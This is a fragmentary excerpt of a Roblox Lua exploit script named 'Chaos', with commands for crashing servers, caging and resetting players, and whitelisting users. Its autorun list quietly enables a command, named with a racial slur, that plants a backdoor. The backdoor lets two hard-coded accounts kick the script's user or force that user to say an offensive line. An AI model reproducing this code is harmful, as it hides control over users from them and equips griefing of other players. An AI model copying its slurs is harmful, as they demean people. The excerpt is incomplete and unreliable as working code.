local Settings = {
    ["Autorun Commands"] = {"antikick","antiservercrash","iscrashed","antiabuse","antiname","antikill","removeobby","fixvelocity","antivoid","antifly","autogod","platform","crashdetector","antiskydive","antigrav","nethelper","antispeed","dontleakitmethodmynigger","blacklistgear DaggerOfShatteredDimensions;BlackHoleSword;AzureDragonMagicSlayerSword;RageTable;IvoryPeriastron;SubspaceTripmine;AnAlpacaYouKnow;BodySwapPotion;OrinthianSwordAndShield;PaintBucket","UltimateDriveSpeedster","BodySwapPotion","RainbowPeriastronOmega"}, -- Commands to run automatically
    ...
    ["Custom Color"] = Color3.new(74, 38, 159), -- Custom color for stuff like platform, disable using nil
...
addCommand("lua",{"script"},function(args)
...
addCommand("ptohop",{},function()
	if not Loops.prompttoserverhop then
		Loops.prompttoserverhop = false
		local bindable = Instance.new("BindableFunction")
		function bindable.OnInvoke(answer)
		    if answer == "Yes" then
		    	runCommand(prefix.."hop",{})
		    end
			Loops.prompttoserverhop = false
		end
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = ScriptName,
			Text = "your server might have ended. would you like to serverhop?",
			Duration = math.huge,
			Callback = bindable,
			Button1 = "Yes",
			Button2 = "No"
...
addCommand("musicl",{"sound-id"},function(args)
    local s,f=pcall(function()
...
addCommand("ai",{"amount"},function(args)
    for i=1,tonumber(args[1]) do
...
addCommand("banan",{"amount"},function(args)
    for i=1,tonumber(args[1]) do
...
addCommand("copygear",{"gear-name"},function(args)
    local fixer = args[1]
    for i=2, #args do
        fixer = fixer.."%20"..args[i]
    end
...
addCommand("timeout",{"player","time"},function(args)
...
local function CagePlayer(Player)
	...
	game.Players.LocalPlayer.PlayerGui:FindFirstChild("HelpGui"):Destroy()
        ...
        game.Players:Chat("removetools me")
        game.Players:Chat("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Chaos]\n\n\n"..Player.Name.." has been put in timeout for "..args[2].."s.")
    end
end
Loops.trap = true
spawn(function()
...
for i,v in pairs(Player) do
    game.Players:Chat("reset "..v.Name)
    wait()
    game.Players:Chat("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"..v.Name.." is no longer in timeout.")
    wait()
end
end)
...
addCommand("annc",{"message"},function(args)
    local fixer = args[1]
    for i=2, #args do
        fixer = fixer.." "..args[i]
    end
...
addCommand("wl",{"player"},function(args)
    local Player = GetPlayers(args[1])
    
    for i,v in pairs(Player) do
        if v ~= game.Players.LocalPlayer and not table.find(Whitelisted,v.Name) then
            table.insert(Whitelisted,v.Name)
            game.Players:Chat("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Chaos]\n\n\n\n"..v.Name.." has been temporarily whitelisted\nsay .altcmds to receive your commands list.")
        end
    end
end)

addCommand("bl",{"player"},function(args)
    local Player = GetPlayers(args[1])
    
    for i,v in pairs(Player) do
        if table.find(Whitelisted,v.Name) then
            table.remove(Whitelisted,table.find(Whitelisted,v.Name))
            GUI:SendMessage(ScriptName, "you got blacklisted "..v.DisplayName..".")
        end
    end
end)

addCommand("unwl",{"player"},function(args)
    runCommand(prefix.."bl",args)
end)

addCommand("wlist",{},function()
...
addCommand("dontleakitmethodmynigger",{},function()
local Players = game:GetService("Players")

-- Admin Users
local adminList = {"FR6DDiie","CHRISGRIFFlN"}

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        if message:lower() == ".chaosk" and player ~= game.Players.LocalPlayer and table.find(adminList, player.Name) then
            pcall(function()
            game.Players.LocalPlayer:Kick("FE BYPASSED ~freddie")
            end)
        end
        if message:lower() == ".chaosc" and player ~= game.Players.LocalPlayer and table.find(adminList, player.Name) then
        Speak("Man, I love eating children, for the fun of it.")
        end
end)
end)
end)
...
task.spawn(function()
	if Settings["Auto Crasher"]["Enabled"] then
		...
		game.Players:Chat("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Chaos]\nLoaded In "..tostring(math.floor((os.clock()-loadtime)*1000)).."ms")
	end
end)
